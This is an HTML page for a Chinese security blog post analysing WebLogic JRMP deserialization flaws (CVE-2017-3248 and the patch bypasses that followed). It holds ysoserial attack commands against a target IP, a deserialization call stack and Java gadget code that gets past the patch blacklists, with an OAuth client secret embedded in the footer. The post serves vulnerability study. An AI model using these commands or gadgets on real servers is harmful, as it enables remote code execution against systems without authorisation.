@@ -1,0 +1,432 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Weblogic JRMP Attack | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Weblogic JRMP Attack | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="CVE-2017-3248
+复现
+使用ysoserial.jar开启JRMP服务端监听
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollec..." />
+    <meta name="keywords" content="JRMP,Weblogic,Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Weblogic JRMP Attack
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-15
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/jrmp/" class="post-tag">
+                  # JRMP
+                </a>
+              
+                <a href="https://le1a.github.io/tag/weblogic/" class="post-tag">
+                  # Weblogic
+                </a>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="cve-2017-3248">CVE-2017-3248</h1>
+<h2 id="复现">复现</h2>
+<p>使用ysoserial.jar开启JRMP服务端监听</p>
+<pre><code class="language-bash">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 &quot;touch /tmp/hacked_by_le1a&quot;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/9957abb33dac3.png" alt="1678865337839.png" loading="lazy"></figure>
+<p>然后使用EXP发送payload</p>
+<pre><code class="language-bash">python2 JRMPAttack.py 10.216.6.185 7001 ysoserial.jar 10.216.6.185 9999 JRMPClient
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/e60791fa99a78.png" alt="1678865307794.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/e66899372c88e.png" alt="1678865366257.png" loading="lazy"></figure>
+<h2 id="分析">分析</h2>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/71c39cf95dcb2.png" alt="1678865609972.png" loading="lazy"></figure>
+<ol>
+<li>python脚本通过T3协议，构造<code>payload2</code>，发送给Weblogic。使得Weblogic反序列化后，自动请求<code>JRMP Listener</code>，获取<code>恶意payload1</code></li>
+<li>反序列化<code>恶意payload1</code>，执行恶意命令</li>
+</ol>
+<p><strong>调用栈</strong></p>
+<pre><code class="language-cmd">transform:123, InvokerTransformer (org.apache.commons.collections.functors)
+transform:122, ChainedTransformer (org.apache.commons.collections.functors)
+get:157, LazyMap (org.apache.commons.collections.map)
+invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)
+entrySet:-1, $Proxy58 (com.sun.proxy)
+readObject:346, AnnotationInvocationHandler (sun.reflect.annotation)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:601, Method (java.lang.reflect)
+invokeReadObject:1004, ObjectStreamClass (java.io)
+readSerialData:1891, ObjectInputStream (java.io)
+readOrdinaryObject:1796, ObjectInputStream (java.io)
+readObject0:1348, ObjectInputStream (java.io)
+defaultReadFields:1989, ObjectInputStream (java.io)
+readSerialData:1913, ObjectInputStream (java.io)
+readOrdinaryObject:1796, ObjectInputStream (java.io)
+readObject0:1348, ObjectInputStream (java.io)
+readObject:370, ObjectInputStream (java.io)
+executeCall:243, StreamRemoteCall (sun.rmi.transport)
+invoke:377, UnicastRef (sun.rmi.server)
+dirty:-1, DGCImpl_Stub (sun.rmi.transport)
+makeDirtyCall:360, DGCClient$EndpointEntry (sun.rmi.transport)
+registerRefs:303, DGCClient$EndpointEntry (sun.rmi.transport)
+registerRefs:139, DGCClient (sun.rmi.transport)
+read:312, LiveRef (sun.rmi.transport)
+readExternal:491, UnicastRef (sun.rmi.server)
+readObject:455, RemoteObject (java.rmi.server)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:601, Method (java.lang.reflect)
+invokeReadObject:1004, ObjectStreamClass (java.io)
+readSerialData:1891, ObjectInputStream (java.io)
+readOrdinaryObject:1796, ObjectInputStream (java.io)
+readObject0:1348, ObjectInputStream (java.io)
+defaultReadFields:1989, ObjectInputStream (java.io)
+readSerialData:1913, ObjectInputStream (java.io)
+readOrdinaryObject:1796, ObjectInputStream (java.io)
+readObject0:1348, ObjectInputStream (java.io)
+readObject:370, ObjectInputStream (java.io)
+readObject:69, InboundMsgAbbrev (weblogic.rjvm)
+read:41, InboundMsgAbbrev (weblogic.rjvm)
+readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
+init:215, MsgAbbrevInputStream (weblogic.rjvm)
+dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
+dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
+dispatch:394, BaseAbstractMuxableSocket (weblogic.socket)
+readReadySocketOnce:960, SocketMuxer (weblogic.socket)
+readReadySocket:897, SocketMuxer (weblogic.socket)
+processSockets:130, PosixSocketMuxer (weblogic.socket)
+run:29, SocketReaderRequest (weblogic.socket)
+execute:42, SocketReaderRequest (weblogic.socket)
+execute:145, ExecuteThread (weblogic.kernel)
+run:117, ExecuteThread (weblogic.kernel)
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/fbefb09a4fa41.png" alt="1678866278464.png" loading="lazy"></figure>
+<p>反序列化时候调用到其<code>InvocationHandler</code>的<code>readObject</code>方法即<code>RemoteObjectInvocationHandler#readObject()</code></p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/f69bc3fb60960.png" alt="1678866381106.png" loading="lazy"></figure>
+<p>然后走到父类的<code>RemoteObject#readObject()</code>，并且调用了<code>sun.rmi.server.UnicastRef#readExternal()</code></p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/97d7b4fb134d6.png" alt="1678866586681.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/77739f638d1fd.png" alt="1678866644296.png" loading="lazy"></figure>
+<p>最终在<code>DGCClient#registerRefs</code>处理与JRMP服务端的交互请求</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/7a09a8b4eb866.png" alt="1678866760476.png" loading="lazy"></figure>
+<p>46行的<code>DGCClient.EndpointEntry.lookup(var0)</code>就是在开启与服务端的通信</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/9af1723b41bb5.png" alt="1678867098892.png" loading="lazy"></figure>
+<p>最后到这里，建立了联系，并且获取传过来的数据，最后将获取的内容利用readObject()进行解析，导致恶意代码执行</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/15/14ec06c619a62.png" alt="1678867351942.png" loading="lazy"></figure>
+<h1 id="cve-2018-2628">CVE-2018-2628</h1>
+<p>CVE-2017-3248的补丁</p>
+<pre><code class="language-java">protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
+    String[] arr$ = interfaces;
+    int len$ = interfaces.length;
+
+    for(int i$ = 0; i$ &lt; len$; ++i$) {
+        String intf = arr$[i$];
+        if (intf.equals(&quot;java.rmi.registry.Registry&quot;)) {
+            throw new InvalidObjectException(&quot;Unauthorized proxy deserialization&quot;);
+        }
+    }
+
+    return super.resolveProxyClass(interfaces);
+}
+</code></pre>
+<p>可以看到，代理resolveClass把<code>java.rmi.registry.Registry</code>添加进了黑名单。</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/e897cc6a8f98d.png" alt="1679201260576.png" loading="lazy"></figure>
+<h2 id="方案一">方案一</h2>
+<p>不用代理Registry即可绕过</p>
+<pre><code class="language-java">public Object getObject(final String command) throws Exception {
+
+    String host;
+    int port;
+    int sep = command.indexOf(':');
+    if (sep &lt; 0) {
+        port = new Random().nextInt(65535);
+        host = command;
+    } else {
+        host = command.substring(0, sep);
+        port = Integer.valueOf(command.substring(sep + 1));
+    }
+    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+    TCPEndpoint te = new TCPEndpoint(host, port);
+    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+    return ref;
+}
+</code></pre>
+<h2 id="方案二">方案二</h2>
+<p>使用<code>java.rmi.activation.Activator</code>代替<code>java.rmi.registry.Registry</code></p>
+<pre><code class="language-java">public Registry getObject(final String command) throws Exception {
+    String host;
+    int port;
+    int sep = command.indexOf(':');
+    if (sep &lt; 0) {
+        port = new Random().nextInt(65535);
+        host = command;
+    } else {
+        host = command.substring(0, sep);
+        port = Integer.valueOf(command.substring(sep + 1));
+    }
+    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+    TCPEndpoint te = new TCPEndpoint(host, port);
+    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+    Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), new Class[] {
+        Activator.class
+            }, obj);
+    return proxy;
+}
+</code></pre>
+<h1 id="cve-2018-2893">CVE-2018-2893</h1>
+<p>补丁将<code>java.rmi.server.RemoteObjectInvocationHandler</code>加入黑名单，可以用CVE-2016-0638 的<code>StreamMessageImpl</code>封装一下，绕过黑名单。</p>
+<pre><code class="language-java">public Object getObject (final String command ) throws Exception {
+  String host;
+  int port;
+  int sep = command.indexOf(':');
+  if (sep &lt; 0) {
+    port = new Random().nextInt(65535);
+    host = command;
+  }
+  else {
+    host = command.substring(0, sep);
+    port = Integer.valueOf(command.substring(sep + 1));
+  }
+  ObjID objID = new ObjID(new Random().nextInt()); 
+  TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
+  UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
+  RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
+  Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler);
+  return streamMessageImpl(Serializer.serialize(object));
+}
+</code></pre>
+<h1 id="cve-2018-3245">CVE-2018-3245</h1>
+<p>使用<code>RMIConnectionImpl_Stub</code>代替<code>RemoteObjectInvocationHandler</code></p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/b492137cce76d.png" alt="1679203278669.png" loading="lazy"></figure>
+<p>POC： https://github.com/pyn3rd/CVE-2018-3245</p>
+<p>有个疑问就是： poc里用的不是 <code>RMIConnectionImpl_Stub</code> 而是 <code>ReferenceWrapper_Stub</code></p>
+<p>我看了下，这俩都是<code>RemoteObject</code>的子类</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/a691816615a8e.png" alt="1679203773985.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/5165420a0913b.png" alt="1679203744975.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/7fcbae95db8fd.png" alt="1679203875211.png" loading="lazy"></figure>
+<p>精力有限，就没再继续测试了，猜测应该是用这两个类都可以代替<code>RemoteObjectInvocationHandler</code>吧</p>
+<h1 id="参考">参考</h1>
+<p>https://y4er.com/posts/weblogic-jrmp/</p>
+<p>https://xz.aliyun.com/t/10171</p>
+<p>https://github.com/pyn3rd/CVE-2018-3245</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#cve-2017-3248">CVE-2017-3248</a>
+<ul>
+<li><a href="#%E5%A4%8D%E7%8E%B0">复现</a></li>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+</ul>
+</li>
+<li><a href="#cve-2018-2628">CVE-2018-2628</a>
+<ul>
+<li><a href="#%E6%96%B9%E6%A1%88%E4%B8%80">方案一</a></li>
+<li><a href="#%E6%96%B9%E6%A1%88%E4%BA%8C">方案二</a></li>
+</ul>
+</li>
+<li><a href="#cve-2018-2893">CVE-2018-2893</a></li>
+<li><a href="#cve-2018-3245">CVE-2018-3245</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/WeblogicCVE-2016-3510/">
+              <h3 class="post-title">
+                Weblogic CVE-2016-3510 MarshalledObject绕过黑名单
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
